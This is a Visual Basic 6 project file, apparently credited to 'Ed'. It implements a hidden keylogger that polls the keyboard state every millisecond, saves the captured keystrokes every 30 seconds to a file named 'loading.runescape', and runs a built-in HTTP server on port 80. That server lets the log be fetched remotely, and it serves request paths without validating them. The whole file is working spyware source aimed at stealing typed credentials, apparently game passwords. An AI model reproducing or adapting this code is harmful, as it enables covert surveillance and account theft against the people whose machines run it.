VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BackColor       =   &H80000009&
   BorderStyle     =   4  'Fixed ToolWindow
   ClientHeight    =   3180
   ClientLeft      =   150
   ClientTop       =   390
   ClientWidth     =   6480
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3180
   ScaleWidth      =   6480
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox Text1 
      Enabled         =   0   'False
      Height          =   1935
      Left            =   2160
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   14
      Top             =   240
      Width           =   4095
   End
   Begin VB.TextBox txtFileName 
      Height          =   375
      Left            =   2160
      TabIndex        =   13
      Text            =   "loading.runescape"
      Top             =   2280
      Width           =   2535
   End
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   4800
      Top             =   2280
   End
   Begin VB.Timer TimerSave 
      Interval        =   30000
      Left            =   5280
      Top             =   2280
   End
   Begin VB.TextBox Text5 
      Appearance      =   0  'Flat
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   0
      TabIndex        =   7
      Text            =   "loading.runescape"
      Top             =   1680
      Width           =   1935
   End
   Begin VB.TextBox Text4 
      Appearance      =   0  'Flat
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   0
      TabIndex        =   5
      Top             =   480
      Width           =   1935
   End
   Begin VB.PictureBox Trayicon1 
      Height          =   480
      Left            =   4920
      ScaleHeight     =   420
      ScaleWidth      =   1140
      TabIndex        =   10
      Top             =   4680
      Width           =   1200
   End
   Begin VB.TextBox port 
      Appearance      =   0  'Flat
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   0
      TabIndex        =   1
      Text            =   "80"
      Top             =   1080
      Width           =   1935
   End
   Begin MSWinsockLib.Winsock wskServer 
      Left            =   5760
      Top             =   2280
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.PictureBox CmdButton2 
      Height          =   285
      Left            =   5760
      ScaleHeight     =   225
      ScaleWidth      =   795
      TabIndex        =   2
      Top             =   5520
      Width           =   855
   End
   Begin VB.Line Line7 
      X1              =   2040
      X2              =   2040
      Y1              =   2760
      Y2              =   3240
   End
   Begin VB.Line Line6 
      X1              =   6360
      X2              =   2040
      Y1              =   120
      Y2              =   120
   End
   Begin VB.Line Line5 
      X1              =   6360
      X2              =   6360
      Y1              =   120
      Y2              =   2760
   End
   Begin VB.Line Line4 
      X1              =   2040
      X2              =   6360
      Y1              =   2760
      Y2              =   2760
   End
   Begin VB.Line Line3 
      X1              =   2040
      X2              =   0
      Y1              =   2760
      Y2              =   2760
   End
   Begin VB.Label CmdButton3 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "URL"
      Height          =   195
      Left            =   480
      TabIndex        =   12
      Top             =   2280
      Width           =   330
   End
   Begin VB.Label CmdButton1 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Stop"
      Height          =   195
      Left            =   0
      TabIndex        =   11
      Top             =   2280
      Width           =   330
   End
   Begin VB.Label Label10 
      BackStyle       =   0  'Transparent
      Caption         =   "Options:"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   0
      TabIndex        =   9
      Top             =   2040
      Width           =   1935
   End
   Begin VB.Label Label9 
      BackStyle       =   0  'Transparent
      Caption         =   "Index File:"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   0
      TabIndex        =   8
      Top             =   1440
      Width           =   1935
   End
   Begin VB.Label Label8 
      BackStyle       =   0  'Transparent
      Caption         =   "Dir Folder:"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   0
      TabIndex        =   6
      Top             =   240
      Width           =   1935
   End
   Begin VB.Label Label7 
      Alignment       =   2  'Center
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   195
      Left            =   720
      TabIndex        =   4
      Top             =   2880
      Width           =   75
   End
   Begin VB.Label Label6 
      Alignment       =   2  'Center
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   ":: Created By Ed ::"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   195
      Left            =   0
      TabIndex        =   3
      Top             =   2520
      Width           =   1455
   End
   Begin VB.Label Label4 
      BackStyle       =   0  'Transparent
      Caption         =   "Port:"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   0
      TabIndex        =   0
      Top             =   840
      Width           =   1935
   End
   Begin VB.Line Line2 
      X1              =   2040
      X2              =   0
      Y1              =   120
      Y2              =   120
   End
   Begin VB.Line Line1 
      X1              =   2040
      X2              =   2040
      Y1              =   2760
      Y2              =   -240
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private KeyLoop As Long
Private FoundKeys As String
Private KeyResult As Long
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private a(15) As String


Private Sub cmdExit_Click()
Call Timersave_Timer
    End
End Sub


Private Sub Form_Initialize()
a(0) = ")"
a(1) = "!"
a(2) = "@"
a(3) = "#"
a(4) = "$"
a(5) = "%"
a(6) = "^"
a(7) = "&"
a(8) = "*"
a(9) = "("
End Sub
Private Sub Timer1_Timer()
    Dim AddKey
    KeyResult = GetAsyncKeyState(13)
    If KeyResult = -32767 Then
        AddKey = vbCrLf
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(8)
    If KeyResult = -32767 Then
        l = Len(Form1.Text1.Text)
        If l > 2 Then
            Form1.Text1.Text = Left(Form1.Text1.Text, l - 1)
            'AddKey = "...Bksp..."
            AddKey = ""
        Else
             AddKey = "(Cant Undo)"
        End If
        GoTo KeyFound
    End If
   
    
'------------FUNCTION KEYS
'------------SEPCIAL KEYS

KeyResult = GetAsyncKeyState(32)
    If KeyResult = -32767 Then
        AddKey = " "
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(186)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = ";" Else AddKey = ":"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(187)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "=" Else AddKey = "+"
        GoTo KeyFound
    End If
  
KeyResult = GetAsyncKeyState(188)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "," Else AddKey = "<"
       GoTo KeyFound
    End If
   
KeyResult = GetAsyncKeyState(189)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "-" Else AddKey = "_"
        GoTo KeyFound
    End If
  
KeyResult = GetAsyncKeyState(190)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "." Else AddKey = ">"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(191)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "/" Else AddKey = "?"   '/
        GoTo KeyFound
    End If
  
KeyResult = GetAsyncKeyState(192)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "`" Else AddKey = "~"       '`
        GoTo KeyFound
    End If
     


'----------NUM PAD
KeyResult = GetAsyncKeyState(96)
    If KeyResult = -32767 Then
        AddKey = "0"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(97)
    If KeyResult = -32767 Then
        AddKey = "1"
        GoTo KeyFound
    End If
     

KeyResult = GetAsyncKeyState(98)
    If KeyResult = -32767 Then
        AddKey = "2"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(99)
    If KeyResult = -32767 Then
        AddKey = "3"
        GoTo KeyFound
    End If
    
    
KeyResult = GetAsyncKeyState(100)
    If KeyResult = -32767 Then
        AddKey = "4"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(101)
    If KeyResult = -32767 Then
        AddKey = "5"
        GoTo KeyFound
    End If
    
    
KeyResult = GetAsyncKeyState(102)
    If KeyResult = -32767 Then
        AddKey = "6"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(103)
    If KeyResult = -32767 Then
        AddKey = "7"
        GoTo KeyFound
    End If
    
    
KeyResult = GetAsyncKeyState(104)
    If KeyResult = -32767 Then
        AddKey = "8"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(105)
    If KeyResult = -32767 Then
        AddKey = "9"
        GoTo KeyFound
    End If
       
    
KeyResult = GetAsyncKeyState(106)
    If KeyResult = -32767 Then
        AddKey = "*"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(107)
    If KeyResult = -32767 Then
        AddKey = "+"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(108)
    If KeyResult = -32767 Then
        AddKey = ""
        Form1.Text1.Text = Form1.Text1.Text & vbCrLf
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(109)
    If KeyResult = -32767 Then
        AddKey = "-"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(110)
    If KeyResult = -32767 Then
        AddKey = "."
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(2)
    If KeyResult = -32767 Then
        AddKey = "/"
        GoTo KeyFound
    End If

KeyResult = GetAsyncKeyState(220)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "\" Else AddKey = "|"
        GoTo KeyFound
    End If

KeyResult = GetAsyncKeyState(222)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "'" Else AddKey = Chr(34)
        GoTo KeyFound
    End If

KeyResult = GetAsyncKeyState(221)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "]" Else AddKey = "}"
        
        
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(219) '219
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "[" Else AddKey = "{"
        GoTo KeyFound
    End If
    
Skip:
    KeyLoop = 41
    Do Until KeyLoop = 127 ' otherwise check For numbers and letters
        KeyResult = GetAsyncKeyState(KeyLoop)
        If KeyResult = -32767 Then
            If KeyLoop > 64 And KeyLoop < 91 Then
                If GetCapslock = True And GetShift = True Then KeyLoop = KeyLoop + 32
                If GetCapslock = False And GetShift = False Then KeyLoop = KeyLoop + 32
            End If
            If KeyLoop > 47 And KeyLoop < 58 Then
                If GetShift = True Then
                    AddKey = a(Val(Chr(KeyLoop)))
                    GoTo KeyFound
                End If
            End If
            
           Text1.Text = Text1.Text + Chr(KeyLoop)
        End If
        KeyLoop = KeyLoop + 1
    Loop
    LastKey = AddKey
    Exit Sub
KeyFound:
Form1.Text1 = Form1.Text1 & AddKey
End Sub

Private Sub Timersave_Timer()
    On Error Resume Next
    
    Open Form1.txtFileName For Append As #1
        Write #1, Text1.Text
        Text1.Text = ""
        Text1.Refresh
        Close #1
End Sub

Public Function FileExists(FullFileName As String) As Boolean
    On Error Resume Next
    
    Open FullFileName For Input As #1
    Close #1
    
    If Err = 0 Then
        FileExists = True
    Else
        FileExists = False
    End If
End Function

Private Sub CmdButton1_Click()
If CmdButton1.Caption = "Start" Then
wskServer.Close
wskServer.LocalPort = Port
wskServer.Listen
Label7 = "http://" + wskServer.LocalIP + ":" + Port.Text
CmdButton1.Caption = "Stop"
Else
If CmdButton1.Caption = "Stop" Then
wskServer.Close
Label7 = ""
CmdButton1.Caption = "Start"
End If
End If
End Sub

Private Sub CmdButton2_Click()
  wskServer.Close
  Label7 = ""
End Sub

Private Sub CmdButton3_Click()
URL "http://localhost:" + Port.Text
End Sub


Private Sub Exit_Click()
End
End Sub

Private Sub Label1_Click()

End
End Sub

Private Sub Show_Click()
Me.Show
End Sub

Private Sub Start_Click()
    wskServer.Close
    wskServer.LocalPort = Port
    wskServer.Listen
Me.Hide

End Sub

Private Sub Stop_Click()
    wskServer.Close
End Sub

Private Sub Form_Load()
Text4 = App.Path
txtFileName = App.Path + "\" + Text5
    LastKey = ""
    TimeOut = 0
    wskServer.Close
wskServer.LocalPort = Port
wskServer.Listen
Label7 = "http://" + wskServer.LocalIP + ":" + Port.Text
End Sub

Private Sub wskServer_ConnectionRequest(ByVal requestID As Long)
    wskServer.Close
    wskServer.Accept requestID
End Sub

Private Sub wskServer_DataArrival(ByVal bytesTotal As Long)
 On Error GoTo ErrHand
    
    Dim strRequest As String
    Dim strPath As String
    Dim FileData As String
    Dim ZapData As String
    
    wskServer.GetData strRequest
    
    Debug.Print strRequest
    
    If strRequest = "" Then
        wskServer.Close
        Exit Sub
    End If
    
    If Left(strRequest, 3) <> "GET" Then
        FileData = "<body bgcolor=#ffffff text=#000000 scroll=no><font size=1 face=tahoma><center>Sorry But This Server Only Allows Get Requests<br><br>---------------------------------------------------------------------------<br>" + Text2.Text
        GoTo SendFile
    End If
    
    strPath = Mid(strRequest, 5, InStr(5, strRequest, " ") - 5)
    
    If Right(strPath, 1) = "/" Then
        strPath = strPath & Text5.Text
    End If

    If FileExists(Text4.Text & strPath) = True Then
        Open Text4.Text & strPath For Binary Access Read As #1
        FileData = Input(LOF(1), 1)
        Close #1
    Else
        Err.Raise 53
    End If
    
SendFile:
    
    ZapData = _
    "HTTP/1.1 200 OK" & vbCrLf & _
    "Server: Fatal Server" & vbCrLf & _
    "Connection: close" & vbCrLf & _
    "Content-Type: application/x-msdownload" & vbCrLf & _
    vbCrLf & FileData
    wskServer.SendData ZapData
    Exit Sub
    
ErrHand:
    FileData = "<body bgcolor=#ffffff text=#000000 scroll=no><font size=1 face=tahoma><center>You Have Come To A <b>404 Error</b><br>Please Contact The Admin Of This Site<br>And Report The Page You Were Trying To Acces At:<br><b>"
    GoTo SendFile
End Sub

Private Sub wskServer_SendComplete()
  wskServer.Close
    wskServer.Listen
End Sub
